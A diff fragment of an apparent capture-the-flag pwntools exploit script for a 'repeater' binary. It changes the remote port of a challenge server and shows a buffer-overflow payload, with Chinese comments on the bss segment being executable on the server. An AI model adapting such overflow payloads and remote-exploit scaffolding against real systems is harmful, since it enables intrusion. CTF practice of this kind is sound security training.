@@ -4,7 +4,7 @@ context.log_level = 'DEBUG'
 elf = context.binary = ELF('../file/repeater')
 
 # p = process('../file/repeater') # 本地测试不行，因为是Ubuntu22.04，会将bss段设置为不可执行
-p = remote('61.147.171.105', '62709') # 服务器上用的旧系统，bss段是可执行的
+p = remote('61.147.171.105', '54048') # 服务器上用的旧系统，bss段是可执行的
 
 payload = b'a' * 0x20 + p64(0x321321)
 
